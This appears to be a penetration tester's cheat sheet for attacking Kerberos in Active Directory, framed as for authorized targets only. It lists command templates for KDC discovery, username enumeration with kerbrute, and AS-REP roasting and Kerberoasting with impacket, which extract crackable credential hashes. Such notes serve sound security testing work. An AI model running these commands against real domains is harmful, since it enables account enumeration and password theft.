# Kerberos (88) — Deep Dive (Authorized targets only)

## Discovery
nmap -p 88 -sU -sV -oA kerberos_scan_<IP> <IP>

## Identify KDC / Realm (AD)
nslookup -type=SRV _kerberos._tcp.<domain>
nslookup -type=SRV _kerberos._udp.<domain>

## Username enumeration (lockout-aware; get approval)
# kerbrute userenum --dc <DC_IP> -d <DOMAIN> users.txt

## AS-REP roast (accounts without preauth) — read-only credential research
# impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asreproast_<DOMAIN>.txt

## SPN discovery (for later constrained attacks, within scope)
# impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request -outputfile spns_<DOMAIN>.csv

## Notes
- Coordinate attempts with blue team; respect account lockout policies.
- Treat any recovered material as highly sensitive; follow handling policy.
